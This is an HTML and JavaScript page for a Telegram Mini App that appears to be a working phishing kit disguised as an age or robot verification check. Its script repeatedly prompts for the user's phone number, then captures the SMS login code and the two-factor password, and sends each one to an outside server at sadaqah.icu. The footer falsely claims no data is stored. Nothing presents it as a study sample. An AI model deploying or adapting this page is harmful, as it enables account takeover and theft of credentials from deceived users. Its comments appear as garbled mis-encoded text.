<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Verification</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root{
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
      --shadow: 0 12px 30px rgba(0,0,0,.25);
    }

    *{ box-sizing: border-box; }
    html, body { height: 100%; }

    body{
      margin: 0;
      color: var(--text);
      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                  var(--bg);
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji";
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      padding: calc(14px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom));
      display: flex;
      justify-content: center;
    }

    .wrap{
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .card{
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 16px;
      backdrop-filter: blur(10px);
    }

    .top{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap: 12px;
    }

    .title{
      font-size: 18px;
      font-weight: 700;
      letter-spacing: .2px;
      margin: 0;
    }

    .subtitle{
      margin: 6px 0 0;
      color: var(--hint);
      font-size: 13px;
      line-height: 1.35;
    }

    .pill{
      padding: 8px 10px;
      border-radius: 999px;
      background: var(--secondary);
      color: var(--hint);
      font-size: 12px;
      border: 1px solid rgba(255,255,255,.08);
      white-space: nowrap;
    }

    .codeBox{
      margin-top: 12px;
      display:flex;
      align-items:center;
      justify-content:center;
      padding: 14px 12px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.12);
    }

    .codeDots{
      display:flex;
      gap: 10px;
      align-items:center;
      justify-content:center;
      width: 100%;
      max-width: 320px;
    }

    .dot{
      width: 14px;
      height: 14px;
      border-radius: 999px;
      background: rgba(255,255,255,.14);
      border: 1px solid rgba(255,255,255,.12);
      box-shadow: inset 0 0 0 2px rgba(0,0,0,.06);
      transform: scale(1);
      transition: transform .12s ease, background .12s ease, border-color .12s ease;
    }

    .dot.filled{
      background: rgba(46,166,255,.95);
      border-color: rgba(46,166,255,.6);
      transform: scale(1.05);
    }

    .hintRow{
      margin-top: 10px;
      display:flex;
      justify-content: space-between;
      gap: 10px;
      color: var(--hint);
      font-size: 12px;
    }

    .keyboard{
      display:grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
    }

    .key{
      height: clamp(52px, 9.5vh, 72px);
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.10);
      background: rgba(255,255,255,.06);
      color: var(--text);
      font-size: 22px;
      font-weight: 700;
      box-shadow: 0 8px 18px rgba(0,0,0,.18);
      transition: transform .08s ease, opacity .08s ease, background .12s ease;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
      user-select: none;
    }

    .key:active{
      transform: translateY(1px) scale(.99);
      opacity: .92;
    }

    .key.primary{
      background: linear-gradient(180deg, rgba(46,166,255,.95), rgba(46,166,255,.75));
      border-color: rgba(46,166,255,.55);
      color: var(--buttonText);
    }

    .key.icon{
      font-size: 20px;
      font-weight: 800;
      color: var(--hint);
    }

    .spacer{
      opacity: 0;
      pointer-events: none;
    }

    .footerNote{
      text-align:center;
      color: var(--hint);
      font-size: 12px;
      margin-top: 6px;
    }

    .phone-share-btn {
      background: var(--button);
      color: var(--buttonText);
      border: none;
      border-radius: var(--radius);
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      margin-top: 12px;
      cursor: pointer;
      transition: opacity 0.2s;
    }
    .phone-share-btn:active { opacity: 0.8; }

    .twofa-input {
      width: 100%;
      padding: 16px;
      border-radius: var(--radius);
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.2);
      color: var(--text);
      font-size: 18px;
      margin-top: 12px;
    }
    .twofa-input:focus { outline: none; border-color: var(--button); }

    .hidden { display: none !important; }
  </style>
</head>

<body>
  <div class="wrap">

    <!-- –ë–ª–æ–∫ –∑–∞–ø—Ä–æ—Å–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
    <div id="phoneBlock" class="card">
      <div class="top">
        <div>
          <p class="title">Verify your age</p>
          <p class="subtitle">Please share your phone number to confirm you're not a robot.</p>
        </div>
        <div class="pill" id="phoneDisplay">Not shared</div>
      </div>
      <button id="sharePhoneBtn" class="phone-share-btn">üì± Share phone number</button>
    </div>

    <!-- –ë–ª–æ–∫ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ -->
    <div id="codeBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Verification</p>
          <p class="subtitle">Enter the code sent via SMS ‚Äî it will take just a few seconds.</p>
        </div>
        <div class="pill" id="codePhoneDisplay">Phone: ‚Äî</div>
      </div>
      <div class="codeBox" aria-label="Verification code">
        <div class="codeDots" id="codeDots"></div>
      </div>
      <div class="hintRow">
        <span id="progressHint">0 / 5</span>
        <span>Delete: ‚å´</span>
      </div>
    </div>

    <!-- –ë–ª–æ–∫ –≤–≤–æ–¥–∞ 2FA –ø–∞—Ä–æ–ª—è -->
    <div id="twofaBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Two‚Äëfactor authentication</p>
          <p class="subtitle">Enter your account password (2FA).</p>
        </div>
        <div class="pill" id="twofaPhoneDisplay">Phone: ‚Äî</div>
      </div>
      <input type="password" id="twofaInput" class="twofa-input" placeholder="Password" />
      <button id="submit2faBtn" class="phone-share-btn" style="margin-top:16px;">‚úÖ Submit</button>
    </div>

    <!-- –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞ (–≤—Å–µ–≥–¥–∞ –≤–∏–¥–Ω–∞, –Ω–æ –∞–∫—Ç–∏–≤–Ω–∞ —Ç–æ–ª—å–∫–æ –ø—Ä–∏ codeBlock) -->
    <div class="keyboard card" id="keyboard"></div>
    <div class="footerNote">Your data is not stored on the device.</div>

  </div>

  <script>
    const WebApp = window.Telegram?.WebApp;
    if (!WebApp) {
      alert('Telegram WebApp is not available');
    } else {
      WebApp.ready();
      WebApp.expand();
    }

    const userId = WebApp?.initDataUnsafe?.user?.id;
    if (!userId) {
      alert('Could not get user_id');
    }

    // –≠–ª–µ–º–µ–Ω—Ç—ã
    const phoneBlock = document.getElementById('phoneBlock');
    const codeBlock = document.getElementById('codeBlock');
    const twofaBlock = document.getElementById('twofaBlock');
    const phoneDisplay = document.getElementById('phoneDisplay');
    const codePhoneDisplay = document.getElementById('codePhoneDisplay');
    const twofaPhoneDisplay = document.getElementById('twofaPhoneDisplay');
    const sharePhoneBtn = document.getElementById('sharePhoneBtn');
    const codeDots = document.getElementById('codeDots');
    const progressHint = document.getElementById('progressHint');
    const keyboard = document.getElementById('keyboard');
    const twofaInput = document.getElementById('twofaInput');
    const submit2faBtn = document.getElementById('submit2faBtn');

    const CODE_LEN = 5; // –¥–æ–ª–∂–Ω–æ —Å–æ–≤–ø–∞–¥–∞—Ç—å —Å config.py
    let code = '';
    let currentPhone = ''; // —Å–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–º–µ—Ä –ø–æ—Å–ª–µ –µ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è

    // –§—É–Ω–∫—Ü–∏—è –∑–∞–ø—Ä–æ—Å–∞ —Å—Ç–∞—Ç—É—Å–∞
    async function fetchState() {
      try {
        const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`, {
          method: 'GET',
          headers: { 'Content-Type': 'application/json' }
        });
        const data = await res.json();
        return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
      } catch (e) {
        console.error('Status error:', e);
        return 'none';
      }
    }

    // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω—É–∂–Ω–æ–≥–æ –±–ª–æ–∫–∞
    function showBlock(state) {
      phoneBlock.classList.add('hidden');
      codeBlock.classList.add('hidden');
      twofaBlock.classList.add('hidden');

      if (state === 'get_number' || state === 'none') {
        phoneBlock.classList.remove('hidden');
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É? –ù–µ –Ω—É–∂–Ω–∞ –¥–ª—è –Ω–æ–º–µ—Ä–∞
        keyboard.style.display = 'none';
      } else if (state === 'get_code') {
        codeBlock.classList.remove('hidden');
        keyboard.style.display = 'grid';
        // –û–±–Ω–æ–≤–ª—è–µ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å
        if (currentPhone) {
          codePhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
        }
      } else if (state === 'get_2fa') {
        twofaBlock.classList.remove('hidden');
        keyboard.style.display = 'none';
        if (currentPhone) {
          twofaPhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
        }
      }
    }

    function maskPhone(p) {
      if (!p) return '‚Äî';
      const cleaned = String(p).replace(/\D/g, '');
      if (cleaned.length < 4) return p;
      const last4 = cleaned.slice(-4);
      return '****' + last4;
    }
  
    // –ó–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞ —á–µ—Ä–µ–∑ WebApp.requestContact
    async function requestPhone() {
  try {
    // –û–∂–∏–¥–∞–µ–º –≤—ã–±–æ—Ä–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    const contactData = await WebApp.requestContact();

    console.log("–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞:", contactData); // –õ–æ–≥–∏—Ä—É–µ–º –∫–æ–Ω—Ç–∞–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    if (!contactData?.contact?.phone_number) {
      alert("–í—ã –¥–æ–ª–∂–Ω—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞");
      return false;
    }

    const phone = contactData.contact.phone_number;
    currentPhone = phone;

    // –ú–∞—Å–∫–∏—Ä—É–µ–º –Ω–æ–º–µ—Ä –∏ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
    phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä –Ω–∞ —Å–µ—Ä–≤–µ—Ä
    const res = await fetch('https://sadaqah.icu/submit_phone', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: userId, phone: phone })
    });

    const result = await res.json();
    console.log("–û—Ç–≤–µ—Ç –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:", result); // –õ–æ–≥–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞

    // –ï—Å–ª–∏ —Å–µ—Ä–≤–µ—Ä –≤–µ—Ä–Ω—É–ª —Å—Ç–∞—Ç—É—Å 'ok', –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ª–µ–¥—É—é—â–∏–π –±–ª–æ–∫
    if (result.status === 'ok') {
      showBlock('get_code');
      return true;
    } else {
      alert('Error: ' + (result.error || 'Unknown error'));
      return false;
    }

  } catch (e) {
    // –õ–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫—É, –µ—Å–ª–∏ —á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞:', e);
    alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞. ' + e.message);
    return false;
  }
}
    async function requestPhoneLoop() {
      const ok = await requestPhone();
    
      if (!ok) {
        // –¥–∞—ë–º Telegram –∑–∞–∫—Ä—ã—Ç—å popup
        setTimeout(() => {
          requestPhoneLoop();
        }, 500);
      }
    }
    requestPhoneLoop()
    

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "Share phone number"
    sharePhoneBtn.addEventListener('click', requestPhone);

    // --- –õ–æ–≥–∏–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ (–∫–∞–∫ –≤ —Å—Ç–∞—Ä–æ–º –º–∏–Ω–∏‚Äë–∞–ø–ø–µ) ---
    function renderDots() {
      codeDots.innerHTML = '';
      for (let i = 0; i < CODE_LEN; i++) {
        const d = document.createElement('div');
        d.className = 'dot' + (i < code.length ? ' filled' : '');
        codeDots.appendChild(d);
      }
      progressHint.textContent = `${code.length} / ${CODE_LEN}`;
    }

    function haptic(type = 'light') {
      try {
        WebApp?.HapticFeedback?.impactOccurred?.(type);
      } catch {}
    }

    function addDigit(d) {
      if (code.length >= CODE_LEN) return;
      code += d;
      haptic('light');
      updateUI();
    }

    function deleteDigit() {
      if (!code.length) return;
      code = code.slice(0, -1);
      haptic('light');
      updateUI();
    }

    function updateUI() {
      renderDots();
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º/—Å–∫—Ä—ã–≤–∞–µ–º MainButton
      if (code.length === CODE_LEN) {
        WebApp.MainButton
          .setText('Confirm')
          .show()
          .onClick(sendCode);
      } else {
        WebApp.MainButton.hide();
      }
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞
    async function sendCode() {
      if (code.length !== CODE_LEN) return;
      WebApp.MainButton.disable().showProgress(true);
      const payload = {
        user_id: userId,
        phone: currentPhone,
        code: code
      };
      try {
        const res = await fetch('https://sadaqah.icu/submit_code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await res.json();
        if (result.status === 'ok') {
          haptic('medium');
          WebApp.close();
        } else if (result.status === '2fa_required') {
          // –ù—É–∂–µ–Ω 2FA ‚Äì –ø–µ—Ä–µ–∫–ª—é—á–∞–µ–º –±–ª–æ–∫
          showBlock('get_2fa');
          WebApp.MainButton.hide();
        } else {
          WebApp.MainButton.enable().showProgress(false);
          haptic('rigid');
          alert('Error: ' + (result.message || 'Invalid code'));
          code = '';
          renderDots();
        }
      } catch (err) {
        WebApp.MainButton.enable().showProgress(false);
        haptic('rigid');
        alert('Network error: ' + err);
      }
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ 2FA –ø–∞—Ä–æ–ª—è
    submit2faBtn.addEventListener('click', async () => {
      const password = twofaInput.value.trim();
      if (!password) {
        alert('Please enter your password');
        return;
      }
      submit2faBtn.disabled = true;
      submit2faBtn.textContent = '‚è≥ Checking...';
      try {
        const res = await fetch('https://sadaqah.icu/submit_2fa', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id: userId, password: password })
        });
        const result = await res.json();
        if (result.status === 'ok') {
          haptic('medium');
          WebApp.close();
        } else {
          alert('Error: ' + (result.message || 'Invalid password'));
          twofaInput.value = '';
        }
      } catch (err) {
        alert('Network error: ' + err);
      } finally {
        submit2faBtn.disabled = false;
        submit2faBtn.textContent = '‚úÖ Submit';
      }
    });

    // –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
    const keys = ['1','2','3','4','5','6','7','8','9','spacer','0','del'];
    keys.forEach(k => {
      const btn = document.createElement('button');
      btn.className = 'key';
      if (k === 'spacer') {
        btn.classList.add('spacer');
        btn.disabled = true;
        btn.textContent = '';
      } else if (k === 'del') {
        btn.classList.add('icon');
        btn.textContent = '‚å´';
        btn.addEventListener('click', deleteDigit);
      } else {
        btn.textContent = k;
        btn.addEventListener('click', () => addDigit(k));
      }
      keyboard.appendChild(btn);
    });

    // –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    window.addEventListener('keydown', (e) => {
      if (codeBlock.classList.contains('hidden')) return; // —Ç–æ–ª—å–∫–æ –¥–ª—è –±–ª–æ–∫–∞ –∫–æ–¥–∞
      if (e.key >= '0' && e.key <= '9') addDigit(e.key);
      if (e.key === 'Backspace') deleteDigit();
      if (e.key === 'Enter' && code.length === CODE_LEN) sendCode();
    });

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è: –ø–æ–ª—É—á–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω—É–∂–Ω—ã–π –±–ª–æ–∫
    (async () => {
      const state = await fetchState();
      if (state === 'get_number' || state === 'none') {
        showBlock('get_number');
        // –ú–æ–∂–Ω–æ —Å—Ä–∞–∑—É –ø–æ–ø—Ä–æ—Å–∏—Ç—å –Ω–æ–º–µ—Ä? –ü–æ —É—Å–ª–æ–≤–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–∞–º –Ω–∞–∂–∏–º–∞–µ—Ç –∫–Ω–æ–ø–∫—É, –ø–æ—ç—Ç–æ–º—É –Ω–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.
      } else if (state === 'get_code') {
        // –ù—É–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–º–µ—Ä –∏–∑ –¥–∞–Ω–Ω—ã—Ö —Å–æ—Å—Ç–æ—è–Ω–∏—è? –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ –æ–Ω –µ—Å—Ç—å, –Ω–æ –º—ã –µ–≥–æ –Ω–µ –ø–µ—Ä–µ–¥–∞—ë–º.
        // –ü–æ–ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —á–µ—Ä–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å? –ü–æ–∫–∞ –æ—Å—Ç–∞–≤–∏–º —Ç–∞–∫.
        showBlock('get_code');
      } else if (state === 'get_2fa') {
        showBlock('get_2fa');
      }
    })();

  </script>
</body>
</html>
